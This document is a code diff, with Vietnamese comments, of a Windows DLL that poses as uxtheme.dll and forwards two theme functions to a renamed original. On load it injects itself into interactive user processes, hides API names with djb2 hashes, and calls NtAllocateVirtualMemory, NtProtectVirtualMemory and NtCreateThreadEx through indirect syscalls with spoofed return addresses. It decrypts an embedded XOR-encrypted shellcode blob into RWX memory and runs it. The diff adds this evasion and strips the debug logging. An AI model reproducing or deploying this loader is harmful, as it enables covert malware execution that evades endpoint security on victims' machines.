@@ -1,53 +1,68 @@
 ﻿
 #include <windows.h>
-#include <cstring>
 #include <winternl.h>
 #include <mutex>
 #include <shlwapi.h>
 #include <uxtheme.h>
-#include <fstream>
 #include <tlhelp32.h>
 #include <string>
 #include <sstream>
-#include <iomanip>
 #include <Psapi.h> 
 #include <processthreadsapi.h>
+#include <sddl.h> 
+#include <vector>
+#include <stdio.h>
+#include <stdarg.h>
+#include <wtsapi32.h>
+#pragma comment(lib, "Wtsapi32.lib")
 
+#define LOG_FILE_PATH "C:\\Users\\Admin\\Desktop\\dll_log.txt"
+
+using namespace std;
 HANDLE g_hSystemWideMutex = NULL;
 
-// Con trỏ để lưu địa chỉ hàm DrawThemeBackground gốc
-typedef HRESULT(WINAPI* FuncDrawThemeBackground)(HTHEME, HDC, int, int, const RECT*, const RECT*);
-typedef HTHEME(WINAPI* FuncOpenThemeData)(HWND, LPCWSTR);
+//void DebugLog(const char* format, ...) {
+//    char buffer[1024];
+//    va_list args;
+//    va_start(args, format);
+//    vsnprintf(buffer, sizeof(buffer), format, args);
+//    va_end(args);
+//
+//    // 1. Gửi ra DebugView (tải tool DebugView của Sysinternals để xem)
+//    OutputDebugStringA(buffer);
+//
+//    // 2. Ghi ra file (Mở và đóng ngay lập tức để đảm bảo dữ liệu được lưu dù có crash sau đó)
+//    FILE* f = NULL;
+//    if (fopen_s(&f, LOG_FILE_PATH, "a") == 0 && f != NULL) {
+//        fprintf(f, "[DLL] %s\n", buffer);
+//        fclose(f);
+//    }
+//}
 
-FuncDrawThemeBackground pOriginalDrawThemeBackground = NULL;
-FuncOpenThemeData pOriginalOpenThemeData = NULL;
-extern "C" HRESULT WINAPI MyDrawThemeBackground(HTHEME hTheme, HDC hdc, int iPartId, int iStateId, const RECT* pRect, const RECT* pClipRect) {
-    if (pOriginalDrawThemeBackground) {
-        HRESULT result = pOriginalDrawThemeBackground(hTheme, hdc, iPartId, iStateId, pRect, pClipRect);
-        return result;
+// PHẦN 1: CẤU HÌNH & HASHING (Giấu tên hàm)
+// Hàm băm chuỗi (Compile-time compatible)
+constexpr DWORD HashString(const char* String) {
+    DWORD Hash = 5381;
+    while (*String) {
+        Hash = ((Hash << 5) + Hash) + *String++; // Hash * 33 + c
     }
-
-    return E_FAIL;
+    return Hash;
 }
+// Hash chuẩn cho thuật toán djb2 (5381)
+#define HASH_NtAllocateVirtualMemory 0x6793C34C 
+#define HASH_NtProtectVirtualMemory  0x082962C8
+#define HASH_NtCreateThreadEx        0xCB0C2130
 
-extern "C" HTHEME WINAPI MyOpenThemeData(HWND hwnd, LPCWSTR pszClassList) {
-    if (pOriginalOpenThemeData) {
-        HTHEME originalHandle = pOriginalOpenThemeData(hwnd, pszClassList);
-        return originalHandle;
-    }
-    return NULL;
-}
+// Khai báo hàm Assembly
+extern "C" NTSTATUS SyscallIndirect(DWORD SSN, PVOID GadgetAddr, PVOID FakeReturnAddress, ...);
 
-std::string ntstatus_to_hex(NTSTATUS status) {
-    std::stringstream ss;
-    ss << "0x" << std::setfill('0') << std::setw(8) << std::hex << status;
-    return ss.str();
-}
+// Cấu trúc chứa thông tin cần thiết để gọi Indirect Syscall
+struct SyscallInfo {
+    DWORD SSN;
+    PVOID SyscallAddress; // Địa chỉ lệnh "syscall" trong ntdll
+    PVOID RetAddress; // RET C3
+};
 
-void LogToFile(const std::string& message) {
-    std::ofstream log_file("Z:\\dll_log.txt", std::ios_base::out | std::ios_base::app);
-    log_file << message << std::endl;
-}
 
 unsigned char encrypted_shellcode[] = {
     0xB1, 0x31, 0xD2, 0x91, 0x80, 0x9A, 0x8D, 0xAC, 0x8D, 0xAF, 0x72, 0x65, 0x74, 0x0A, 0x34, 0x38,
@@ -109,77 +124,151 @@ unsigned char stage1_stub[] = {
     0x41, 0xFF, 0xE2                    // JMP R10
 };
 
-// === PHẦN 2: LOGIC GIẢI MÃ & THỰC THI ============================================================
 
-// Tìm SSN của một hàm trong ntdll.dll dựa vào tên
-DWORD GetSsnByName(const char* functionName) {
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) return 0;
+// PARSER NTDLL (Tìm SSN và Gadget)
+//// Hàm lấy thông tin Syscall bằng cách duyệt Export Table của ntdll.dll
+SyscallInfo GetSyscallInfo(DWORD FunctionHash) {
+    SyscallInfo info = {0 , NULL, NULL};
 
-    FARPROC funcAddr = GetProcAddress(hNtdll, functionName);
-    if (!funcAddr) return 0;
+    PEB* peb = (PEB*)__readgsqword(0x60);// Đọc 8 byte ở GS
+    // Ldr chứa danh sách các module đã nạp: ntdll.dll, kernel32.dll,...
+    PEB_LDR_DATA* ldr = peb->Ldr;
 
-    BYTE* pFunction = (BYTE*)funcAddr;
-    if (pFunction[0] == 0x4C && pFunction[1] == 0x8B && pFunction[2] == 0xD1 && pFunction[3] == 0xB8) {
-        return *(DWORD*)(pFunction + 4);
+    LIST_ENTRY* listHead = &ldr->InMemoryOrderModuleList;
+    LIST_ENTRY* listCurrent = listHead->Flink;// Lấy phần tử đầu tiên trong DoubleLinkList
+
+    PVOID ntdllBase = NULL;
+
+    // Tim ntdll trong danh sach module da nap
+    while (listCurrent != listHead) {
+        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+        if (entry->DllBase) {
+            ntdllBase = entry->DllBase;
+
+            PBYTE dllBytes = (PBYTE)ntdllBase;
+            //PE file bắt đầu bằng DOS header "MZ"
+            PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBytes;
+            // e_lfanew = offset tới NT header
+            PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllBytes + dosHeader->e_lfanew);
+
+            // Neu khong co export table -> khong phai ntdll
+            if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size == 0) {
+                listCurrent = listCurrent->Flink;
+                continue;
+            }
+
+            //exportDir:
+            //số lượng tên hàm
+            //số lượng ordinal
+            //địa chỉ bảng tên
+            //địa chỉ bảng RVA
+            PIMAGE_EXPORT_DIRECTORY exportDir =
+                (PIMAGE_EXPORT_DIRECTORY)(dllBytes +
+                    ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+            //DebugLog("[.] Scanning DLL at Base: %p", entry->DllBase);
+
+            // Lay cac bang export
+            DWORD* names = (DWORD*)(dllBytes + exportDir->AddressOfNames); // mảng RVA của tên hàm
+            DWORD* functions = (DWORD*)(dllBytes + exportDir->AddressOfFunctions);// mảng RVA của code hàm
+            WORD* ordinals = (WORD*)(dllBytes + exportDir->AddressOfNameOrdinals);// index map từ tên → ordinal
+
+            bool found = false;
+            // Duyệt danh sách hàm export
+            for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
+                const char* funcName = (const char*)(dllBytes + names[i]);
+
+                DWORD calculatedHash = HashString(funcName);
+
+                if (calculatedHash == FunctionHash) {
+                    DWORD funcRVA = functions[ordinals[i]];
+                    PBYTE funcAddr = dllBytes + funcRVA;
+
+                    // --- TRÍCH XUẤT SSN ---
+                    info.SSN = *(DWORD*)(funcAddr + 4);
+                    // --- TÌM LỆNH SYSCALL GẦN ĐÓ (OF 05)
+                    for (int z = 0; z < 32; z++) {
+                        if (funcAddr[z] == 0x0F && funcAddr[z + 1] == 0x05) {
+                            info.SyscallAddress = (PVOID)(funcAddr + z);
+
+                            // RETURN ADDRESS;
+                            for (int r = 2; r < 10; r++) { // Quét 8 byte sau lệnh syscall
+                                if (funcAddr[z + r] == 0xC3) {
+                                    info.RetAddress = (PVOID)(funcAddr + z + r);
+                                    break; // Đã tìm thấy RET an toàn
+                                }
+                            }
+
+                            if (info.RetAddress == NULL) {
+                                // Nếu không tìm thấy RET an toàn trong 8 bytes, không thể thực hiện Stack Spoofing
+                                //DebugLog("[-] Could not find a safe RET address after syscall.");
+                                // Giữ RetAddress là NULL và thoát.
+                            }
+                            else {
+                                //DebugLog("[+] Found safe RET address at: %p", info.RetAddress);
+                            }
+                            found = true;
+                            //DebugLog("[+] FOUND Hash 0x%X (%s) | SSN: %d | Gadget: %p", FunctionHash, funcName, info.SSN, info.SyscallAddress);
+                            break;
+                        }
+                    }
+
+                    if (found) {
+                        //DebugLog("[+] Found Hash 0x%X (%s) | SSN: %d (0x%X) | Gadget: %p",
+                        //    FunctionHash, funcName, info.SSN, info.SSN, info.SyscallAddress);
+                        break;
+                    }
+                }
+            }
+
+            if (found) break; // Đã tìm thấy hàm trong DLL này
+        }
+        listCurrent = listCurrent->Flink;
     }
-    return 0;
+
+    return info;
 }
 
-#ifndef NT_SUCCESS
-#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
-#endif
 
-// Khai báo các hàm syscall được viết trong file .asm
-extern "C" NTSTATUS MyNtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG, DWORD);
-extern "C" NTSTATUS MyNtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG, DWORD);
-extern "C" NTSTATUS MyNtCreateThreadEx(PHANDLE,
-    ACCESS_MASK             DesiredAccess,
-    POBJECT_ATTRIBUTES      ObjectAttributes,
-    HANDLE                  ProcessHandle,
-    LPTHREAD_START_ROUTINE  StartRoutine,
-    LPVOID                  Argument,
-    ULONG                   CreateFlags,
-    ULONG_PTR               ZeroBits,
-    SIZE_T                  StackSize,
-    SIZE_T                  MaximumStackSize,
-    LPVOID                  AttributeList,
-    DWORD                   Ssn
-);
+// === PHẦN 2: LOGIC GIẢI MÃ & THỰC THI ============================================================
 // Hàm thực thi shellcode, chạy trong một luồng riêng.
 void ExecuteInjectedLogic() {
-    LogToFile("Entering ExecuteInjectedLogic.");
+    SyscallInfo alloc = GetSyscallInfo(HASH_NtAllocateVirtualMemory);
+    SyscallInfo protect = GetSyscallInfo(HASH_NtProtectVirtualMemory);
+    SyscallInfo create = GetSyscallInfo(HASH_NtCreateThreadEx);
 
-    DWORD ssnAllocate = GetSsnByName("NtAllocateVirtualMemory");
-    DWORD ssnProtect = GetSsnByName("NtProtectVirtualMemory");
-    DWORD ssnCreateThreadForShellcode = GetSsnByName("NtCreateThreadEx");
+    // Kiểm tra nếu tìm thất bại
+    if (!alloc.SyscallAddress || !protect.SyscallAddress || !create.SyscallAddress ||
+        !alloc.RetAddress || !protect.RetAddress || !create.RetAddress) {
+        //DebugLog("[!] Failed to resolve syscalls or safe RetAddress. Exiting.");
+        return;
+    }
 
     // Cấu trúc bộ nhớ sẽ là: [KEY][SHELLCODE][STUB]
     SIZE_T key_size = sizeof(xor_key) - 1; // -1 để không bao gồm ký tự null
     SIZE_T shellcode_size = sizeof(encrypted_shellcode);
     SIZE_T stub_size = sizeof(stage1_stub);
     SIZE_T total_payload_size = key_size + shellcode_size + stub_size;
-    LogToFile("Total payload size: " + std::to_string(total_payload_size)); // <-- THÊM MỚI
 
+    HANDLE hProcess = GetCurrentProcess();
+    PVOID baseAddr = NULL;
+    SIZE_T size = total_payload_size;
 
-    HANDLE processHandle = GetCurrentProcess();
-    PVOID baseAddress = NULL;
-    SIZE_T regionSize = total_payload_size;
+    //DebugLog("[-] Call NtAllocateVirtualMemory. Size: %lld", size);
 
-    LogToFile("Attempting to allocate virtual memory...");
-    NTSTATUS status = MyNtAllocateVirtualMemory(
-        processHandle, &baseAddress, 0, &regionSize,
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, ssnAllocate
+    NTSTATUS status = SyscallIndirect(
+        alloc.SSN, alloc.SyscallAddress, alloc.RetAddress,
+        hProcess, &baseAddr, 0, &size,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
     );
 
-    if (!NT_SUCCESS(status) || !baseAddress) {
-        LogToFile("MyNtAllocateVirtualMemory FAILED. NTSTATUS: " + ntstatus_to_hex(status)); // <-- THAY ĐỔI
-        return;
+    if (status != 0) {
+        //DebugLog("[!] NtAllocateVirtualMemory FAILED. Status: 0x%X", status);
+        return; // Dừng nếu Syscall đầu tiên lỗi
     }
+    //DebugLog("[+] Allocated at: %p", baseAddr);
 
-    LogToFile("Memory allocated successfully at address " + ntstatus_to_hex((uintptr_t)baseAddress)); // <-- THÊM MỚI
-
-    PBYTE pCurrent = (PBYTE)baseAddress;
+    PBYTE pCurrent = (PBYTE)baseAddr;
 
     // Chép key
     RtlMoveMemory(pCurrent, xor_key, key_size);
@@ -192,114 +281,193 @@ void ExecuteInjectedLogic() {
     // Chép stub và lưu lại địa chỉ của nó để thực thi
     PVOID stub_location = pCurrent;
     RtlMoveMemory(stub_location, stage1_stub, stub_size);
-
-    LogToFile("Payload (key, shellcode, stub) copied to allocated memory."); // <-- THÊM MỚI
+    //DebugLog("[-] Key/Shellcode/Stub copied. Stub Location: %p", stub_location);
 
     ULONG oldProtect;
-    LogToFile("Attempting to change memory protection to PAGE_EXECUTE_READWRITE..."); // <-- THÊM MỚI
-    status = MyNtProtectVirtualMemory(
-        processHandle, &baseAddress, &regionSize,
-        PAGE_EXECUTE_READWRITE, &oldProtect, ssnProtect
-    );
+    //DebugLog("[-] Call NtProtectVirtualMemory to PAGE_EXECUTE_READWRITE");
+    status = SyscallIndirect(
+        protect.SSN, protect.SyscallAddress, protect.RetAddress,
+        hProcess, &baseAddr, &size,
+        PAGE_EXECUTE_READWRITE, &oldProtect);
 
-    if (!NT_SUCCESS(status)) {
-        LogToFile("MyNtProtectVirtualMemory FAILED. NTSTATUS: " + ntstatus_to_hex(status)); // <-- THAY ĐỔI
+    if (status != 0) {
+        //DebugLog("[!] NtProtectVirtualMemory FAILED. Status: 0x%X", status);
         return;
     }
-    LogToFile("Memory protection changed successfully."); // <-- THÊM MỚI
+    //DebugLog("[+] Memory protected with EXECUTE_READWRITE.");
 
     // Tạo luồng để chạy STUB (giải mã và chạy shellcode)
-    HANDLE hShellcodeThread;
-    LogToFile("Attempting to create shellcode execution thread..."); // <-- THÊM MỚI
-    MyNtCreateThreadEx(
-        &hShellcodeThread, GENERIC_EXECUTE, NULL, processHandle,
-        (LPTHREAD_START_ROUTINE)stub_location,
-        NULL, 0, 0, 0, 0, NULL, ssnCreateThreadForShellcode
-    );
+    HANDLE hThread = NULL;
+    //DebugLog("[-] Call NtCreateThreadEx. StartAddress: %p", stub_location);
 
-    // Đóng handle sau khi tạo để tránh rò rỉ tài nguyên
-    if (hShellcodeThread) {
-        CloseHandle(hShellcodeThread);
+    status = SyscallIndirect(
+        create.SSN, create.SyscallAddress, create.RetAddress,
+        &hThread, GENERIC_EXECUTE, NULL, hProcess,
+        stub_location, NULL, 0, 0, 0, 0, NULL);
+
+
+    if (status != 0) {
+        //DebugLog("[!] NtCreateThreadEx FAILED. Status: 0x%X", status);
+        return;
     }
     else {
-        LogToFile("MyNtCreateThreadEx FAILED to create shellcode thread."); // <-- THÊM MỚI
+        if (hThread) CloseHandle(hThread);
+        //DebugLog("[+] Thread created successfully.");
     }
+}
+
+// Con trỏ để lưu địa chỉ hàm DrawThemeBackground gốc
+typedef HRESULT(WINAPI* FuncDrawThemeBackground)(HTHEME, HDC, int, int, const RECT*, const RECT*);
+typedef HTHEME(WINAPI* FuncOpenThemeData)(HWND, LPCWSTR);
+
+FuncDrawThemeBackground pOriginalDrawThemeBackground = NULL;
+FuncOpenThemeData pOriginalOpenThemeData = NULL;
+extern "C" HRESULT WINAPI MyDrawThemeBackground(HTHEME hTheme, HDC hdc, int iPartId, int iStateId, const RECT* pRect, const RECT* pClipRect) {
+    if (pOriginalDrawThemeBackground) {
+        HRESULT result = pOriginalDrawThemeBackground(hTheme, hdc, iPartId, iStateId, pRect, pClipRect);
+        return result;
+    }
+
+    return E_FAIL;
+}
+
+extern "C" HTHEME WINAPI MyOpenThemeData(HWND hwnd, LPCWSTR pszClassList) {
+    if (pOriginalOpenThemeData) {
+        HTHEME originalHandle = pOriginalOpenThemeData(hwnd, pszClassList);
+        return originalHandle;
+    }
+    return NULL;
 }
 bool InitializeProxyFunctions() {
 
     // Nạp DLL hệ thống từ vị trí đáng tin cậy của nó
     HMODULE hOriginalUxtheme = LoadLibraryA("uxtheme_.dll");
     if (hOriginalUxtheme) {
-        LogToFile("uxtheme_.dll loaded successfully in initializer.");
-
         pOriginalOpenThemeData = (FuncOpenThemeData)GetProcAddress(hOriginalUxtheme, "OpenThemeData");
         pOriginalDrawThemeBackground = (FuncDrawThemeBackground)GetProcAddress(hOriginalUxtheme, "DrawThemeBackground");
         if (pOriginalOpenThemeData && pOriginalDrawThemeBackground) {
             return true;
         }
         else {
-            LogToFile("Failed to get addresses of proxy functions from uxtheme_.dll.");
             return false;
         }
     }
     else {
-        LogToFile("CRITICAL ERROR: Failed to load uxtheme_.dll in initializer!");
         return false;
     }
 }
 
-bool IsProcessProtected() {
-    // Lấy handle của tiến trình hiện tại
-    HANDLE hProcess = GetCurrentProcess();
+bool IsUserInteractiveProcess() {
+    DWORD sessionId;
+    DWORD processId = GetCurrentProcessId();
 
-    PROCESS_PROTECTION_LEVEL_INFORMATION protectionInfo = { 0 };
+    if (!ProcessIdToSessionId(processId, &sessionId)) {
+        return false; // Lỗi API -> An toàn nhất là không chạy
+    }
 
-    if (GetProcessInformation(hProcess, ProcessProtectionLevelInfo, &protectionInfo, sizeof(protectionInfo))) {
-        // Hàm chạy thành công, kiểm tra kết quả
-        if (protectionInfo.ProtectionLevel != PROTECTION_LEVEL_NONE) {
-            // Nếu mức bảo vệ khác "None", đây là tiến trình được bảo vệ.
-            LogToFile("Detected a protected process. Level: " + std::to_string(protectionInfo.ProtectionLevel));
-            return true;
+    // Nếu là Session 0, đây là Services hoặc System Core -> BỎ QUA
+    if (sessionId == 0) {
+        return false;
+    }
+
+    // KIỂM TRA XEM CÓ PHẢI "IMMERSIVE" APP KHÔNG (UWP/Metro Apps)
+    // Các app như Calculator, Settings, SearchApp thường chạy trong AppContainer
+    // Payload chạy trong đây thường thiếu quyền hoặc gây crash.
+
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        DWORD isAppContainer = 0;
+        DWORD returnLength = 0;
+
+        if (GetTokenInformation(hToken, TokenIsAppContainer, &isAppContainer, sizeof(isAppContainer), &returnLength)) {
+            if (isAppContainer != 0) {
+                CloseHandle(hToken);
+                return false; // Đây là UWP App (SearchApp, Cortana...) -> BỎ QUA
+            }
         }
+        CloseHandle(hToken);
     }
-    else {
-        // Hàm thất bại, coi như nó được bảo vệ
-        LogToFile("Failed to get process info via GetProcessInformation. Assuming protected. Error: " + std::to_string(GetLastError()));
-        return true;
-    }
-
-    // Nếu mọi thứ ổn và mức độ là "None", đây là tiến trình bình thường.
-    return false;
+    return true; // Đây là tiến trình người dùng bình thường (Session > 0 và không phải UWP)
 }
 
+bool IsSystemProcess() {
+    HANDLE hToken = NULL;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        return false;
+    }
+
+    DWORD dwSize = 0;
+    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
+
+    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
+        CloseHandle(hToken);
+        return false;
+    }
+
+    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(dwSize);
+    if (!pTokenUser) {
+        CloseHandle(hToken);
+        return false;
+    }
+
+    bool isSystem = false;
+    // Lấy thông tin User SID
+    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
+        // Tạo SID chuẩn của Local System (S-1-5-18)
+        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
+        PSID pSystemSid = NULL;
+
+        if (AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
+            0, 0, 0, 0, 0, 0, 0, &pSystemSid)) {
+
+            // So sánh SID hiện tại với SID của SYSTEM
+            if (EqualSid(pTokenUser->User.Sid, pSystemSid)) {
+                isSystem = true;
+            }
+            FreeSid(pSystemSid);
+        }
+    }
+
+    free(pTokenUser);
+    CloseHandle(hToken);
+    return isSystem;
+}
 DWORD WINAPI MainPayloadThread(LPVOID lpParam) {
-    /*if (!InitializeProxyFunctions()) {
-        LogToFile("InitThread: failed to init proxy, aborting payload.");
-        return 0;
-    }*/
+    SECURITY_ATTRIBUTES sa;
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.bInheritHandle = FALSE;
+
+    if (!ConvertStringSecurityDescriptorToSecurityDescriptorA(
+        "D:(A;;GA;;;WD)",
+        SDDL_REVISION_1,
+        &(sa.lpSecurityDescriptor),
+        NULL)) {
+
+        return 1;
+    }
+
 
     const char* mutexName = "Global\\{E8A3B2C1-F0D4-4E65-8A71-C7A5D6789B0F}";
-    HANDLE hMutex = CreateMutexA(NULL, TRUE, mutexName);
+    HANDLE hMutex = CreateMutexA(&sa, TRUE, mutexName);
 
     if (hMutex == NULL) {
-        LogToFile("Critical error creating mutex. GetLastError: " + std::to_string(GetLastError()));
+        DWORD err = GetLastError();
+
+        if (err == ERROR_ACCESS_DENIED) { // Lỗi số 5
+            return 0; // Thoát êm đẹp, không coi là lỗi.
+        }
         return 1;
     }
 
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
         // Mutex đã tồn tại, tiến trình này không phải là "người chiến thắng".
-        LogToFile("Mutex already exists. Not launching payload in this process.");
         CloseHandle(hMutex);
         return 0;
     }
 
     g_hSystemWideMutex = hMutex;
-    LogToFile("Mutex acquired. This process is the WINNER. Waiting for UI stabilization.");
-
-    LogToFile("Proxy initialized. Launching payload.");
     ExecuteInjectedLogic();
 
-    Sleep(INFINITE);
     return 0;
 }
 
@@ -313,19 +481,19 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
             }
             DisableThreadLibraryCalls(hModule);
 
-            HANDLE hThread = CreateThread(NULL, 0, MainPayloadThread, NULL, 0, NULL);
-            if (hThread) {
-                CloseHandle(hThread);
+            if (IsSystemProcess()) {
+                break; // Thoát khỏi case, không chạy xuống dưới
             }
-            else {
-                LogToFile("FATAL: Failed to create MainPayloadThread in DllMain.");
+
+            if (IsUserInteractiveProcess()) {
+                HANDLE hThread = CreateThread(NULL, 0, MainPayloadThread, NULL, 0, NULL);
+                if (hThread) CloseHandle(hThread);
             }
             break;
         }
         case DLL_PROCESS_DETACH:
         {
             if (g_hSystemWideMutex != NULL) {
-                LogToFile("Winner process is detaching. Releasing the system-wide mutex.");
                 ReleaseMutex(g_hSystemWideMutex);
                 CloseHandle(g_hSystemWideMutex);
             }
